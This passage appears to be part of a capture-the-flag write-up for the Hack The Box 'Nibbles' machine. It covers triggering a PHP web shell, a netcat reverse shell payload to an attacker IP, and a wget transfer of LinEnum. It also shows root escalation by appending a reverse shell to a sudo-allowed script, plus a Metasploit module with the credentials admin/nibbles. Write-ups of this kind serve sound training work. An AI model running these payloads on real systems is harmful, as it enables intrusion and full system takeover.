### 11. Trigger Web Shell
Visit:
```bash
http://10.129.249.115/nibbleblog/content/private/plugins/my_image/image.php
```
You’ll get UID confirmation.

### ✅ Shell Executed Successfully

### 12. Get a Reverse Shell
Use this payload:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 9443 >/tmp/f"); ?>
```
Start listener:
```bash
nc -lvnp 9443
```

### 🔁 Reverse Shell Payload (Netcat)

### 13. Post-Exploitation
Unzip personal.zip:
```bash
unzip personal.zip
```

### 🗂️ Unzipped personal.zip  
![Found monitor.sh inside archive](/assets/img/htb/nibbles/17_nibble.jpg)

### 14. Transfer and Run LinEnum
On attacker:
```bash
sudo python3 -m http.server 8080 - make sure same dir as linenum
```
On target:
```bash
wget http://10.10.14.76:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### 15. Privilege Escalation via monitor.sh
From LinEnum:
```text
(ALL) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Exploit:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 8443 >/tmp/f' >> /home/nibbler/personal/stuff/monitor.sh
nc -lvnp 8443
sudo /home/nibbler/personal/stuff/monitor.sh
```

### ⚠️ Sudo Rights for monitor.sh

### 👑 Root Reverse Shell

### 🧨 Root Flag
```bash
cat /root/root.txt
```
```text

```

### 🏁 Root Flag Captured

### ⚡ Metasploit Alternative (Optional)
If you want to skip manual steps:
```bash
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.249.115
set RPORT 80
set TARGETURI /nibbleblog
set USERNAME admin
set PASSWORD nibbles
exploit
```
This gives you a meterpreter shell directly.

### 🛡️ Conclusion
The Nibbles box reinforces how outdated CMS versions and weak plugin validation can lead to full system compromise. Enumeration, basic scripting, and privilege escalation misconfigs made this a solid beginner box.
